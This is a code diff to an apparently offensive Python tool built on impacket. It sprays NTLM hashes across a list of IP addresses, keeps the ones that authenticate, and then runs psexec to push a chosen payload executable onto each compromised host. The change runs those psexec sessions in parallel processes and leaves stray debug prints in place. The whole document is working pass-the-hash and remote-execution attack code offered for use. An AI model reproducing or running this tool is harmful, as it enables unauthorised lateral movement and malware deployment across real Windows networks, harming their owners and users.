@@ -7,6 +7,7 @@ import re
 import argparse
 import signal
 from impacket.smbconnection import *
+import multiprocessing
 
 class timeout:
     def __init__(self, seconds, error_message='Timeout'):
@@ -21,15 +22,25 @@ class timeout:
         signal.alarm(0)
 
 t = blessings.Terminal()
+targetsprayhash = []
+targetipseperated = []
+workinghashes = []
+targetpassword=None
+command=""
+path=""
+copyFile=""
+
+def RunPsexec(exeFile,targetusername,psexechash,targetdomain,targetpassword,psexecip):
+    print "test2"
+    PSEXEC = psexec.PSEXEC(command, path, exeFile, copyFile, protocols=None, username=targetusername,
+                           hashes=psexechash, domain=targetdomain, password=targetpassword, aesKey=None, doKerberos=False)
+    print t.bold_green + "\n[*] Starting Psexec...." + t.normal
+    try:
+        PSEXEC.run(psexecip)
+    except SessionError:
+        print t.bold_red + "[*] Clean Up Failed, Remove Manually with Shell"
 
 def DoPsexecSpray(exeFile, hashfile="", ipfile="", username="", domain=""):
-    targetsprayhash = []
-    targetipseperated = []
-    workinghashes = []
-    targetpassword=None
-    command=""
-    path=""
-    copyFile=""
     print t.bold_green + "[*] Chosen Payload: " + t.normal + exeFile
     if not hashfile:
         targethash = raw_input("[*] Enter Hashes Seperated by Comma: ")
@@ -48,7 +59,6 @@ def DoPsexecSpray(exeFile, hashfile="", ipfile="", username="", domain=""):
         file = open(ipfile,"r")
         for ip in file:
             targetipseperated.append(ip.strip("\n"))
-
 
     if not username:
         targetusername = raw_input("[*] Enter Username: ")
@@ -78,22 +88,23 @@ def DoPsexecSpray(exeFile, hashfile="", ipfile="", username="", domain=""):
             except:
                 print t.bold_red + "[!] This Hash Failed" + t.normal
 
-    print t.green + "\n[*] Working Hashes:"
-    for hash in workinghashes:
-        print t.bold_green + hash + t.normal
-
     if workinghashes:
+        print t.green + "\n[*] Working Hashes:"
+        for hash in workinghashes:
+            print t.bold_green + hash + t.normal
+
         want_to_psexec = raw_input("[*] Run Psexec on Working Hashes? [Y/n]: ")
         if want_to_psexec.lower() == "y" or want_to_psexec == "":
             for hash in workinghashes:
                 psexechash,psexecip = hash.split(",")
-                PSEXEC = psexec.PSEXEC(command, path, exeFile, copyFile, protocols=None, username=targetusername,
-                                       hashes=psexechash, domain=targetdomain, password=targetpassword, aesKey=None, doKerberos=False)
-                print t.bold_green + "\n[*] Starting Psexec...." + t.normal
-                try:
-                    PSEXEC.run(psexecip)
-                except SessionError:
-                    print t.bold_red + "[*] Clean Up Failed, Remove Manually with Shell"
+                print "test"
+                b = multiprocessing.Process(
+                    target=RunPsexec, args=(exeFile,targetusername,psexechash,targetdomain,targetpassword,psexecip))
+                if __name__ == "__main__":
+                    b.daemon=False
+                else:
+                    b.daemon=True
+                b.start()
     else:
         print t.bold_red + "[!] No Working Hashes. Exiting..." + t.normal
 
